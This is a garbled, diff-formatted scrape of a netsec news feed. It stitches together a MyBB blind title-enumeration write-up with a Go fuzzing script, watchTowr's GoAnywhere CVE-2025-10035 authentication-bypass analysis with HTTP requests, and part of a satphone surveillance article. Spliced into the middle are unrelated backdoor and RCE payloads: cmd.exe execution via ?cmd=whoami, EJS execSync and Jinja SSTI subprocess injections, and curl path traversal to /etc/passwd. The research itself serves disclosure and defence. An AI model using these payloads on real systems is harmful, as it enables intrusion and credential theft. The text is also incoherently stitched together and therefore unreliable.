-case, the length is 5, and it breaks the `foreach` loop, because of which
-our second word, "+jack*", won't even get replaced. Later, it will be passed
-into MATCH AGAINST
-
-----[ 4.3 - Exploiting
-The query, as you can see, has a response showing the tid and firstpost. The
-reason why this works for the title and not for the content is because of
-"p.visible = 1" and "t.visible = 1", but we will come to that later.
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-    else
-    {
-        $query = $db->query("
-            SELECT t.tid, t.firstpost
-            FROM ".TABLE_PREFIX."threads t
-            WHERE 1=1 {$thread_datecut} {$thread_replycut}
-              {$thread_prefixcut} {$forumin} {$thread_usersql} {$permsql}
-              {$visiblesql} {$subject_lookin}
-            {$limitsql}
-        ");
-        while($thread = $db->fetch_array($query))
-        {
-            $threads[$thread['tid']] = $thread['tid'];
-            if($thread['firstpost'])
-            {
-                $firstposts[$thread['tid']] = $thread['firstpost'];
-            }
-        }
-        if(count($threads) < 1)
-        {
-            error($lang->error_nosearchresults);
-        }
-        $threads = implode(',', $threads);
-        $firstposts = implode(',', $firstposts);
-        if($firstposts)
-        {
-            $query = $db->simple_select("posts", "pid", "pid IN
-              ($firstposts) {$plain_post_visiblesql} {$limitsql}");
-            while($post = $db->fetch_array($query))
-            {
-                $posts[$post['pid']] = $post['pid'];
-            }
-            $posts = implode(',', $posts);
-        }
-    }
-    return array(
-        "threads" => $threads,
-        "posts" => $posts,
-        "querycache" => ''
-    );
---------------------------------------------------------------------------
-Query in DB:
---------------------------------------------------------------------------
-mysql> SELECT t.tid, t.firstpost FROM mybb_threads t WHERE 1=1 AND
-    -> MATCH(subject) AGAINST('+&&&&& +jack*' IN BOOLEAN MODE);
-+-----+-----------+
-| tid | firstpost |
-+-----+-----------+
-|   2 |         2 |
-+-----+-----------+
-1 row in set (0.00 sec)
---------------------------------------------------------------------------
-Now the MOST important part here is
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-        if(count($threads) < 1)
-        {
-            error($lang->error_nosearchresults);
-        }
---------------------------------------------------------------------------
-If the response has no result, it will open "error_nosearchresults";
-otherwise, it will REDIRECT. This is why it is possible to identify title
-name, without seeing it. If I get a redirect when using "jack*", it means
-that there is a title that starts with "jack", otherwise it would directly
-open "error_nosearchresults". Now inside upload/search.php, we see this
-line, which shows where we get redirected. The thing is, we wouldn't have
-been able to reach this line if the response from MySQL had been empty.
-----------------------------------
-/upload/search.php
-
-redirect("search.php?action=results&sid=".$sid."&sortby=".$sortby."&order="
-  .$sortorder, $lang->redirect_searchresults);
-----------------------------------
-
-It is possible to exploit this vulnerability by fuzzing. The logic here is:
-I start with a*, then aa*, ab*, ac*, and so on. In a real-world scenario,
-an attacker would have multiple accounts, or proxies. In the test
-environment I just put "Search Flood Time (seconds)" to 0. Basic script:
-
---------------------------------------------------------------------------
-package main
-
-import (
-    "fmt"
-    "io"
-    "net/http"
-    "os"
-    "strings"
-)
-
-const fuzzChars = "abcdefghijklmnopqrstuvwxyz0123456789"
-const queryTemplate = "search.php?action=do_search&keywords=%26%26%26%26%26"
-  + "+%2B{FUZZ}*xD&postthread=2&author=&matchusername=1&forums%5B%5D=all"
-  + "&findthreadst=1&numreplies=&postdate=0&pddir=1&sortby=lastpost"
-  + "&sortordr=desc&showresults=threads&submit=Search"
-const successIndicator = "end: redirect"
-const maxFuzzPayloadLength = 50
-
-func min(a, b int) int {
-    if a < b {
-        return a
-    }
-    return b
-}
-
-func main() {
-    if len(os.Args) < 2 {
-        fmt.Fprintln(os.Stderr, "Usage: go run test.go <base_url>")
-        fmt.Fprintln(os.Stderr, "Example: go run test.go http://127.0.0.1")
-        os.Exit(1)
-    }
-    baseURL := strings.TrimSuffix(os.Args[1], "/")
-
-    fmt.Printf("Target base URL: %s\n", baseURL)
-    fmt.Printf("Fuzzing characters: %s\n", fuzzChars)
-    fmt.Printf("Max fuzz payload length: %d\n", maxFuzzPayloadLength)
-    fmt.Println("---")
-
-    client := &http.Client{
-        CheckRedirect: func(req *http.Request, via []*http.Request) error {
-            return nil
-        },
-    }
-
-    var allFoundSuccessfulPayloads []string
-    var payloadsToTestThisRound []string
-
-    for _, charRune := range fuzzChars {
-        payloadsToTestThisRound = append(payloadsToTestThisRound,
-          string(charRune))
-    }
-
-    for currentLength := 1; currentLength <= maxFuzzPayloadLength;
-      currentLength++ {
-        if len(payloadsToTestThisRound) == 0 {
-            fmt.Printf("No more payloads to test. Stopping as no payloads" +
-              " generated for length %d.\n", currentLength)
-            break
-        }
-
-        fmt.Printf("--- Testing payloads of length %d (found %d to test)" +
-          " ---\n", currentLength, len(payloadsToTestThisRound))
-        var successfulPayloadsFoundThisRound []string
-
-        for _, fuzzPayload := range payloadsToTestThisRound {
-            fuzzedQuery := strings.Replace(queryTemplate, "{FUZZ}",
-              fuzzPayload, 1)
-            fullURL := baseURL + "/" + fuzzedQuery
-           
-            urlToPrint := fullURL
-            if len(urlToPrint) > 120 {
-                urlToPrint = urlToPrint[:117] + "..."
-            }
-            fmt.Printf("Testing payload: '%s' (URL: %s)\n", fuzzPayload,
-              urlToPrint)
-
-            req, err := http.NewRequest("GET", fullURL, nil)
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error creating request for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
-
-            resp, err := client.Do(req)
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error making GET request for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
-
-            bodyBytes, err := io.ReadAll(resp.Body)
-            resp.Body.Close()
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error reading response body for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
-
-            bodyString := string(bodyBytes)
-            if strings.Contains(bodyString, successIndicator) {
-                fmt.Printf("  SUCCESS! Payload: '%s' (Status: %s)." +
-                  " Response contains '%s'.\n", fuzzPayload, resp.Status,
-                  successIndicator)
-                allFoundSuccessfulPayloads = append(allFoundSuccessfulPayloads,
-                  fuzzPayload)
-                successfulPayloadsFoundThisRound =
-                  append(successfulPayloadsFoundThisRound, fuzzPayload)
-            }
-        }
-
-        if currentLength < maxFuzzPayloadLength {
-            if len(successfulPayloadsFoundThisRound) == 0 {
-                fmt.Printf("No successful payloads found at length %d." +
-                  " Stopping further iterations.\n", currentLength)
-                payloadsToTestThisRound = []string{}
-            } else {
-                var nextPayloads []string
-                for _, prefix := range successfulPayloadsFoundThisRound {
-                    for _, charRune := range fuzzChars {
-                        nextPayloads = append(nextPayloads,
-                          prefix+string(charRune))
-                    }
-                }
-                payloadsToTestThisRound = nextPayloads
-                if len(payloadsToTestThisRound) == 0 &&
-                  len(successfulPayloadsFoundThisRound) > 0 {
-                    fmt.Println("Warning: Generated empty next set of" +
-                      " payloads despite successes in current round. This" +
-                      " might happen if fuzzChars is empty. Stopping.")
-                    break
-                }
-            }
-        } else {
-            fmt.Printf("Reached max payload length of %d.\n",
-              maxFuzzPayloadLength)
-        }
-    }
-
-    fmt.Println("--- Fuzzing Complete ---")
-    if len(allFoundSuccessfulPayloads) > 0 {
-        fmt.Printf("Found %d successful payload(s) in total:\n",
-          len(allFoundSuccessfulPayloads))
-        for _, p := range allFoundSuccessfulPayloads {
-            fmt.Printf("  - %s\n", p)
-        }
-    } else {
-        fmt.Println("No successful payloads found.")
+            FileName = "cmd.exe",
+            Arguments = "/c " + cmd,
+            RedirectStandardOutput = true,
+            UseShellExecute = false
+        });
+        <pre>@proc.StandardOutput.ReadToEnd()</pre>
+        proc.WaitForExit();
     }
 }
---------------------------------------------------------------------------
+GET /Home/Backdoor?cmd=whoamiRuby on Rails - RCE via ERB Templateapp/views/pages/backdoor.html.erbGET /pages/backdoor?cmd=whoamiapp/controllers/backdoor_controller.rbGET /backdoor/shell?cmd=whoami (requires route)Node.js/Express - RCE via EJS Options Injection Just exploit render options:Or write malicious template:<%= process.mainModule.require('child_process').execSync(query.cmd).toString() %>
+PHP/Laravel - RCE via Blade Templateresources/views/backdoor.blade.phpGET /page/backdoor?cmd=whoamiPython/Django - RCE via  Overwrite or any package in PYTHONPATH Any request that causes module import (or restart if debug mode)Alternative - SSTI (if template injection exists):{​{ request.environ ​}​​​​}
+{​{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() ​}​​​​}
+Python/Flask - RCE via  Overwrite Flask package  or app module Restart or import (debug mode auto-reloads)​​{​{config.items() }​}
+{​{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() ​}​​​​}
+{​{ request.environ.get('FLAG') ​}​​​​}
+Go/Gin - SSTI File Read (Not RCE)No file write needed if SSTI exists:Echo Framework - Arbitrary File Read: Go templates are sandboxed; RCE is extremely difficult without custom functions.Step 5: Detection - With Source Code Access config/routes.rb
 
---[ 5 - Acknowledgements
-Thanks to the MyBB team, especially to Devilshakerz for the fast
-remediation!
+ app/controllers/.rb | Step 6: Detection - WITHOUT Source Code (Black Box)
+curl  https://target.com/
+curl  https://target.com/Home/../../test
+curl  https://target.com/Home/NonExistentAction
 
---[ 6 - References
-[ 0 ] https://en.wikipedia.org/wiki/Regular_expression
-[ 1 ] https://en.wikipedia.org/wiki/Wildcard_character
-[ 2 ] https://owasp.org/www-community/attacks/Regular_expression
-_Denial_of_Service_-_ReDoS
-[ 3 ] https://www.imperva.com/learn/ddos/regular-expression-denial-of-
-service-redos/
-[ 4 ] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/
-Regular_expressions
-[ 5 ] https://dev.mysql.com/doc/refman/8.4/en/regexp.html
-[ 6 ] https://en.wikipedia.org/wiki/Full-text_search
-[ 7 ] https://dev.mysql.com/doc/refman/8.4/en/fulltext-boolean.html
-[ 8 ] https://dev.mysql.com/doc/refman/8.4/en/fulltext-search.html
-[ 9 ] https://github.com/mybb
-]]></content:encoded></item><item><title>New macOS threat abuses ads and social media to spread malware</title><link>https://moonlock.com/new-iphones-anti-spyware</link><author>/u/Individual-Gas5276</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 13:39:19 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Is This Bad? This Feels Bad. (GoAnywhere CVE-2025-10035) - watchTowr Labs</title><link>https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/</link><author>/u/dx7r__</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 13:04:10 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[File transfer used to be simple fun - fire up your favourite FTP client, log in to a glFTPd site, and you were done.Fast forward to 2025, and the same act requires a procurement team, a web interface, and a vendor proudly waving their  pledge. Ever seen the glFTPd developers on the list of pledge signers? Exactly.Welcome back to another watchTowr Labs analysis. This time, we are dissecting , a perfect CVSS 10.0 vulnerability in Fortra’s GoAnywhere MFT.For the uninitiated, GoAnywhere is a "secure" managed file transfer solution that automates and protects data exchange across enterprises, trading partners, and critical applications. Not your friend's photo-sharing setup. We are talking Fortune 500 deployments, with over 20,000 instances exposed to the Internet. A playground APT groups dream about.GoAnywhere has a history. In 2023, the cl0p ransomware gang turned CVE-2023-0669, a pre-auth command injection in the Licensing Response Servlet, into widespread compromise. That was the year of MFT exploitation trauma across multiple vendors, burned into the memory of defenders everywhere.As always, and you'll read, we have an inner feeling (call it "instinct") that there is more to this vulnerability that we are not yet being told.On Thursday, September 18, Fortra published a security advisory fi-2025-012 titled: Deserialization Vulnerability in GoAnywhere MFT's License Servlet.The title in itself is reason for alarm, with the description going further to explain how we likely got to a CVSS 10.0:A deserialization vulnerability in the License Servlet of Fortra's GoAnywhere MFT allows an actor with a validly forged license response signature to deserialize an arbitrary actor-controlled object, possibly leading to command injection.For those that recall the excitement of CVE-2023-0669, this description might feel.. familiar..:GoAnywhere MFT suffers from a pre-authentication command injection vulnerability in the License Response Servlet due to deserializing an arbitrary attacker-controlled objectBut watchTowr, how did this get a CVSS 10.0? The advisory clearly states meaningful hurdles for attackers to traverse:Exploitation of this vulnerability is highly dependent upon systems being externally exposed to the Internet.Fortra, should the advisory also note that the solution needs to be running?In The Wild Exploitation?As always, we must all play a game.The above sometimes happens when a vendor updates references attached to a CVE. In this case, FI-2025-011 was deleted, and FI-2025-012 was added to replace it.In FI-2025-012, a section was appended - an innocent "Am I Impacted?" section.Typically (not always...), when a vulnerability receives in-the-wild exploitation, clarity to customers is provided to help inform prioritisation and remediation process expectations.Fortra's advisory never says, “We’ve seen this exploited in-the-wild.” What they do say is more curious: check your Admin Audit logs, look for  in exception traces, and if you see it, you were “likely affected.”Affected, as in, vulnerable? Or affected like, the fox is already in the hen-house?To determine if you're "affected", Fortra provides an IoC (Indicator of ) for this ambiguous-state vulnerability. As discussed above, the advisory for FI-2025-012 includes a stack trace which will appear in your logs should you be "affected" by this vulnerability:ERROR Error parsing license response
-java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
-...
-at java.base/java.io.ObjectInputStream.readObject(Unknown Source)
-at java.base/java.security.SignedObject.getObject(Unknown Source)
-at com.linoma.license.gen2.BundleWorker.verify(BundleWorker.java:319)
-at com.linoma.license.gen2.BundleWorker.unbundle(BundleWorker.java:122)
-at com.linoma.license.gen2.LicenseController.getResponse(LicenseController.java:441)
-at com.linoma.license.gen2.LicenseAPI.getResponse(LicenseAPI.java:304)
-at com.linoma.ga.ui.admin.servlet.LicenseResponseServlet.doPost(LicenseResponseServlet.java:64)
-We know Fortra wouldn't be ambiguous on purpose, though, because CISA's Secure By Design pledge, which Fortra signed up to, talks about transparency around ITW exploitation:Part 1 - License Servlet “Authentication” BypassThe initial vendor advisory was clear, immediately pointing to the culprit: the License Servlet. Key points from the advisory:The License Servlet contains an insecure deserialization vulnerability.According to the CVSS score, it’s reachable without authentication.So, first things first: can we actually hit the servlet and trigger the deserialization routine without credentials? To answer that, we need to crack open the code.The License Servlet lives in com.linoma.ga.ui.admin.servlet.LicenseResponseServlet and is exposed at:/goanywhere/lic/accept/<GUID>Let’s take a look at the entry point:public void doPost(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
-    String var3 = var1.getParameter("bundle"); // [1]
-    String[] var4 = var1.getRequestURI().split("/"); // [2]
-    String var5 = var4[var4.length - 1];
-    Object var6 = null;
-    if (!SessionUtilities.isLicenseRequestTokenValid(var5, var1.getSession())) { // [3]
-        LOGGER.error("Unauthorized bundle from invalid session: " + var3);
-        var2.sendError(400);
-        var1.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
-    } else {
-        try {
-            var9 = LicenseAPI.getResponse(var3); // [4]
-        } catch (Exception var8) {
-            LOGGER.error("Error parsing license response", var8);
-            var2.sendError(500);
-            var1.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
-            return;
-        }
-    //...
- }
-At  the servlet retrieves the  parameter from the HTTP request.At  it extracts a string from our URL - a GUID that defines the license request token.At  it calls SessionUtilities.isLicenseRequestTokenValid to validate the user-supplied license request token.If the check at  passes, the servlet calls  with the  parameter.So, how does token validation (the GUID) actually work? Well...The servlet takes the GUID token extracted at .It compares that token to the token that was stored on the user’s session.If both tokens match, the validation at  succeeds and execution proceeds to .If the tokens do not match, the flow stops - we never reach the deserialization code.So: without a valid token tied to the user session, we cannot even begin to reach the vulnerable deserialization routine.OK, We Need A Token - But How?Well, if your target GoAnywhere MFT instance has no license applied, this is trivial - you can head straight to the endpoint that starts the activation procedure, and a valid token will be applied to your session.However, this is not a production reality where licenses are inevitably provided - and this is not as simple. Typically, in such a case, you need to be authenticated to generate a valid license request token and attach it to your session.Our vulnerability is a perfect 10 CVSS, though, so logically there must be a way to obtain this token without any authentication. All of our analysis led us to the /goanywhere/license/Unlicensed.xhtml endpoint, where we discovered a few important items:We can bypass authentication requirements for this endpoint by appending  (or any other invalid data) to the endpoint, like so: /goanywhere/license/Unlicensed.xhtml/x .We need this endpoint to trigger an exception - for example, by providing an invalid , like this: /goanywhere/license/Unlicensed.xhtml/x?javax.faces.ViewState=x&GARequestAction=activateWhy, you ask? Because, in doing so, the application then flows to the  servlet, where all of our fun begins:protected void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
-    Integer var3 = (Integer)var1.getAttribute("javax.servlet.error.status_code");
-    String var4 = (String)var1.getAttribute("javax.servlet.error.message");
-    Class var5 = (Class)var1.getAttribute("javax.servlet.error.exception_type");
-    String var6 = (String)var1.getAttribute("javax.servlet.error.request_uri");
-    Throwable var7 = (Throwable)var1.getAttribute("javax.servlet.error.exception");
-    String var8 = var1.getRemoteAddr();
-    String var9 = var1.getParameter("GARequestAction");
-    if (var3 == null && var5 == null && var7 == null) {
-        var2.sendError(404);
-    } else if (!this.bypassHandling(var3, var6)) {
-        if (var6.startsWith(var1.getContextPath() + "/license/Unlicensed.xhtml")) { // [1]
-            if (StringUtilities.isNotEmpty(var9) && var9.equalsIgnoreCase("activate")) {
-                String var14 = SessionUtilities.generateLicenseRequestToken(var1.getSession()); // [2]
 
-                try {
-                        LicenseUtilities.requestOnlineActivation(var1, var2, var14); // [3]
-                        return;
-                    } catch (Exception var13) {
-                        this.LOGGER.error(var13.getMessage(), var13);
-                    }
-                }
+curl  https://target.com/
+curl  https://target.com/pages/test
+curl  https://target.com/pages/../../../../etc/passwd
 
-                var2.sendRedirect(var6);
-                //...
-}
-At , the code checks whether the request URL begins with /license/Unlicensed.xhtml.If it does, then at  the application generates a valid license-request token and attaches it to the session.Finally, at , the token is passed to LicenseUtilities.requestOnlineActivation. This method builds a redirect URL to the GoAnywhere license server, embedding the signed license request inside an HTTP GET  parameter.Now, for anyone who doesn’t live and breathe GoAnywhere MFT’s licensing process, the license request does two key things:It stores a serialized Java object containing the license-request token.It’s encrypted with hard-coded keys (and partially compressed for good measure).An attacker can simply send:GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&GARequestAction=activate HTTP/1.1
-Host: {{Hostname}}
-In response, the server redirects and returns a  parameter (the license request) — plus a cookie where the generated token has been attached.HTTP/1.1 302 
-...
-Location: <https://my.goanywhere.com:443/lic/request?bundle=p55wfyVKXDVM_bAVZtDLOg3PglFmtEOHyjm4vYZ9l2kwhyouIP6ieq_VZ6lJbVsf5J7KHr..... snip .....
-Because the encryption key is hard-coded, the  parameter value can be decrypted offline to recover the embedded GUID. Using said GUID, we are then able to interact with the License Servlet without "actually" authenticating:POST /goanywhere/lic/accept/d1a8b697-d68c-4e7d-b179-5f3b8b529e6f HTTP/1.1
-Host: {{Hostname}}
-Cookie: ASESSIONID=F970BB906F5F7D325BFC6E261CF87AE6;
-Content-Type: application/x-www-form-urlencoded
+curl  https://target.com/pages/../../../../etc/passwd 2>&1 | 
+curl  https://target.com/
+curl curl  https://target.com/nonexistent
 
-bundle=inputhere
-There we have it - the "Authentication Bypass" portion of this vulnerability. Let's move on...Part 2 - Insecure Deserialization in License ServletNow that we can obtain the GUID token unauthenticated, we can reach the deserialization sink that this vulnerability ends with.For your sake, and our sanity, we are going to skip the majority of the code and leave you with two basic facts you need to know:The  parameter carries a serialized Java object that the server decrypts during processing.Decryption uses hard-coded keys, so the  parameter value is recoverable offline.Processing eventually reaches com.linoma.license.gen2.BundleWorker.verify, where the application hands us the raw input byte array derived from the .In short, an attacker-controlled serialized object reaches server-side deserialization logic.Let's step through com.linoma.license.gen2.BundleWorker.verify:private static byte[] verify(byte[] var0, KeyConfig var1) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
-    String var2 = "SHA1withDSA";
-    if ("2".equals(var1.getVersion())) {
-        var2 = "SHA512withRSA";
-    }
+curl  https://target.com/
 
-    PublicKey var3 = getPublicKey(var1);
-    Signature var4 = Signature.getInstance(var2);
-    SignedObject var5 = (SignedObject)JavaSerializationUtilities.deserialize(var0, SignedObject.class, new Class[]{byte[].class}); // [1]
-    if (var1.isServer()) {
-        return ((SignedContainer)JavaSerializationUtilities.deserializeUntrustedSignedObject(var5, SignedContainer.class, new Class[]{byte[].class})).getData();
-    } else {
-        boolean var6 = var5.verify(var3, var4); // [2]
-        if (!var6) {
-            throw new IOException("Unable to verify signature!");
-        } else {
-            SignedContainer var7 = (SignedContainer)var5.getObject(); // [3]
-            return var7.getData();
-        }
-    }
-}
-This part can be a little confusing, so let’s stick to the key points.At  the code calls into a hardened deserialization wrapper (wrapping around ValidatingObjectInputStream.readObject from standard Apache libraries), to deserialize our data.It also supplies extra arguments, such as , which define the only types the routine will accept during deserialization.Those additional arguments restrict what types can be deserialized. In practice, this means the routine will only accept a java.security.SignedObject or a raw .So what is a ? According to the Java documentation:SignedObject is a class for the purpose of creating authentic runtime objects whose integrity cannot be compromised without being detected.More specifically, a SignedObject contains another Serializable object, the (to-be-)signed object and its signature.In simple terms, a  is just a wrapper. It stores a serialized object inside and a signature calculated over that stream with a private key alongside it.The class also provides a few helper methods: - uses the public key to check that the signature matches. - deserializes and returns the inner serialized object.At , the code will call  on our deserialized , immediately allowing an attacker to:Deliver a serialized .Which internally stores a malicious serialized object, like a one based on the  gadget.GoAnywhere will deserialize this inner object, and that’s it.Do you see what we missed? Look at .The code checks the signature of our serialized object against a public key baked into GoAnywhere. On paper, this is sensible. Signature validation is handled by Bouncy Castle and its FIPS API.So the final barrier to a pre-auth RCE is bypassing that signature check. But here’s the problem: we don’t know how. Really.Either we are missing a trick, or the check is genuinely solid. We tried:Using several private keys shipped in GoAnywhere to generate a valid signature. None of them matched the public key in play.Reviewing the Java code responsible for the signature verification.Chasing alternative code paths that might hit deserialization without needing this check.One might think: just diff the patch, you dummies.Here’s the kicker though. The patch  harden the deserialization routine, but the signature verification logic? Completely untouched.The patch doesn’t amend the signature check at all. Instead, it only changes the deserialization flow, replacing  with a custom wrapper called deserializeUntrustedSignedObject. The idea seems to be to add another layer of “safety” around deserialization.We’ve got a few conspiracy theories, though, all of which we have absolutely zero evidence for, and are complete conjecture. Regardless,you’re free to pick whichever one fits your mood: We somehow missed an obvious bypass for the signature verification routine. If that’s the case, why didn’t the patch touch it?  The private key leaked. Dramatic, yes, but possible. That would let attackers sign malicious objects that every GoAnywhere instance on the planet would happily accept.The vendor accidentally signed evil. Imagine this:When you activate your GoAnywhere product, your installation generates a serialized license request.It’s sent to the vendor’s license server ()If someone slipped a malicious object inside that request and the vendor blindly signed it, attackers would now have a perfectly valid signed payload that works everywhere.Fueling our conspiracy theories was the advisory deletion and reference update we discussed above, including a stack trace which signals a valid exploitation attempt and asks the user to check their logs:Who does that? Well, in our opinion, typically vendors whose products are facing ITW exploitation - but we're not experts.It’s all a mystery. We can’t see a path to exploit this without a valid private key. On paper, that should kill the bug dead. On the other hand, this has a perfect 10 CVSS score, and the vendor has published "IoCs," which indicates that it is likely real.And on the other hand, we recently saw a critical CVE in Sitecore that existed purely because… people were copy-pasting machine keys straight from the documentation. At this point, nothing shocks us. CVE assignments feel less like a science and more like a game of darts in the dark.Detection Artefact GeneratorAcross our client base, we used the Authentication Bypass weakness within an impact-less (but still exploitation-based) mechanism to identify unpatched and vulnerable GoAnywhere systems at scale. Today, we're sharing this mechanism:GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&GARequestAction=activate HTTP/1.1
-If the instance is unpatched, you’ll see the response include a  header with a license request embedded in the  query string parameter:If you don’t see the   parameter, your instance is patched. That’s because the  no longer generates a valid license request token once the fix is applied.: redirect to /license/Unlicensed.xhtml with a valid license request token attached.: redirect to /license/Unlicensed.xhtml with  license request token.No mystery is complete without a few unanswered questions. Despite our usual routine of reverse engineering and creative detours, we’ve ended this one with more questions than usual.Did we miss critical lines of code that makes everything click into place? Will the first reply on social media point out the obvious and send us a working PoC embedded in a meme? Please.Because the alternatives are less comforting. Could this vulnerability already be in active use? Could someone have access to a signed malicious object ready to be sprayed across the Internet or delivered with precision to a single target? Could that be happening right now?One thing is certain: no vendor assigns a CVSS 10 to a purely theoretical bug. We'd advise against leaving GoAnywhere unpatched below 7.8.4 (or Sustain Release 7.6.3).While this mystery continues to evolve, and we're excited to see if anyone takes the baton from us, concerned operators and end users can use our Detection Artefact Generator to check for externally vulnerable instances. The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.By combining Proactive Threat Intelligence and External Attack Surface Management into a single Preemptive Exposure Management capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: Gain early access to our research, and understand your exposure, with the watchTowr PlatformREQUEST A DEMO]]></content:encoded></item><item><title>Tiantong-1 and satphone security: Part 2</title><link>https://www.midnightblue.nl/blog/tiantong-1-and-satphone-security-part-2</link><author>/u/2ROT13</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 09:38:25 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[General satphone SIGINT capabilitiesGiven their prominence in matters of national security, it is unsurprising there are many (commercialized) SIGINT capabilities for satphones available. In fact according to an internal publication by the NSA’s Signals Intelligence Directorate (SID) from 2006, contained in the Snowden leaks, GMR-based Thuraya was considered one of the US intelligence community’s top priorities. In addition to satellite-based monitoring capabilities as exemplified by the MENTOR 4 SIGINT satellite closely following the Thuraya 2 satellite, significant investments were made in ground-based collection capabilities using the NSA’s and systems.According to a leaked publication from 2003, the NSA did not have the desired Foreign Satellite interception (FORNSAT) coverage at the time. In these and other publications, a picture emerges of rapidly expanding collection sites numbering 9 in 2002 to 12 (+40 regional) sites in 2012 in addition to collection performed through 2nd party partners via the STATEROOM program.Regional collection happens through Special Collection Service (SCS) units based at embassies and consulates as neatly summarized by Electrospaces. These units not only service interception posts at the embassies themselves but also roll out covert surveillance infrastructure throughout a target country.While no current publications seem to mention Tiantong-1, there is much information available about SIGINT capabilities for GMR-based SATCOM systems such as Thuraya and Inmarsat. Such information can be obtained from public brochures by vendors such as Stratign, Shoghi, and Pegasus Intelligence as well as product brochures from vendors such as L-3 TRL, Rheinmetall, Verint, and Rhode & Schwarz leaked as part of the Wikileaks Spy Files. All of these systems seem to have fairly identical capabilities, architectures, and challenges.They offer passive interception capabilities allowing for:: Including extraction of content (through automatic real-time decryption as described below) and metadata (e.g. spot beam ID, caller numbers, times, cryptographic information, etc.).‍: Though certain vendors state this is considered difficult due to extensive coverage areas and large spot beams, some claim to extract GPS coordinates from handset traffic or achieve geo-location based on network location information or overlap areas.‍: Audio recording, speech analysis (speaker & language identification, keyword spotting, etc.), media carving, OCR, and typical link analysis and dataset querying.Regardless of the GMR version or frequency bands in use, the general operating principle comes down to satellites covering a large geographical area in smaller, focused areas of coverage referred to as . For example, the GMR-1 based Thuraya system consists of several satellites each covering a different geographical area. These areas are then subdivided into dozens of spotbeams each covering hundreds of kilometers.As illustrated below, communications within a single spotbeam take place in the L-band while feeder link communications between gateway stations and satellites take place in C-/Ku-bands in the regional beam.Two-way (duplex) traffic interception is only possible in a limited number of spot beams (depending on distance between spotbeams with similar signal characteristics such as frequencies and timeslots) centered around a monitoring system. , monitoring and intercepting satphone communications presents several challenges related to synchronization (such as differing delays when signals are captured at different geographical points), missing directional traffic (forward/return links), and complexities in mapping captures from spotbeams to those from regional beams. This typically means all available channels need to be intercepted simultaneously even if one's actual area of interest may be limited.‍On the other hand, feeder link communications can be monitored from any location within the satellite’s footprint area. These communications allow for monitoring (but not intercepting) call activity on return links in multiple spotbeams (without requiring spotbeam coverage by a local monitoring system) via received signaling information (which includes geo-location relevant data and caller IDs).‍It should be noted that interception capabilities are not merely constrained by satellite system architectural aspects but also by hardware capabilities such as the numbers of frequency channels that can be monitored simultaneously. Such limitations depend limitations of utilized DSP/FPGA technology and rack space for system modules. In addition, export controls tend to restrict capabilities as well such as artificially limiting the number of simultaneously monitorable calls.While most of the GMR-1 interception equipment discussed here can likely not be repurposed easily against Tiantong, there is plenty of COTS SDR hardware available these days capable of handling S- and C-Band traffic that could serve as the basis for a TT monitoring solution.As leaked documents from a Rhode & Schwarz GMR-2 monitoring system show most satphone monitoring systems consist of several elements:Strategic Monitoring SystemThese systems, sometimes referred to as central stations, are typically capable of continuous live monitoring and interception of terminals in surrounding cluster of spotbeams and include integrated decryption and analytic capabilities. Such systems are likely based at dedicated SIGINT sites or SCS locations.These systems allow for expanding system coverage and full duplex interception capabilities with several additional spotbeams surrounding the remote monitoring system. Remote monitoring systems are typically connected to strategic systems through always-on connections (e.g. PTSN, WAN, or satellite link). Such remote monitoring systems are likely rolled out throughout a country by SCS operators, and likely connect back to the in-country SCS site.‍Tactical Monitoring SystemTactical monitoring systems are for use by operational teams requiring real-time intercept of terminals in areas either lacking spotbeam coverage. These systems are typically highly portable and vehicle-mountable and facilitate otherwise hard-to-obtain terminal uplink interception capabilities up to tens of kilometers within line-of-sight. Optimal usage requires site surveys to determine suitable monitoring location and antenna positioning.Airborne Monitoring SystemIn addition to the above listed stationary monitoring systems, certain vendors also offer airborne satphone monitoring systems for deployment on manned and unmanned aircraft - essentially offering similar advantages to the tactical monitoring system.Supply chain security & 'hard targets'Ever since the NotPetya and SolarWinds incidents supply chain security has been an increasingly hot topic. Worries around (hardware) supply chain security have recently taken on an additional kinetic dimension with the Israeli attacks on pagers and VHF radios operated by Hezbollah in Lebanon.‍The Volkskrant article mentions typical operational security measures taken against supply chain threats to the procured Tiantong smartphones such as trying to ensure non-sequential serial numbers and limited batch sizes (no doubt also opting for diversified manufacturers and points of sale).Interestingly, the leaked NSA ANT catalog shows that as far back as 2008-2009 the NSA had developed a software implant named for the Thuraya 2520 satphone handsets. The implant was described as being deployed through (temporary) physical access to the satphone though remote 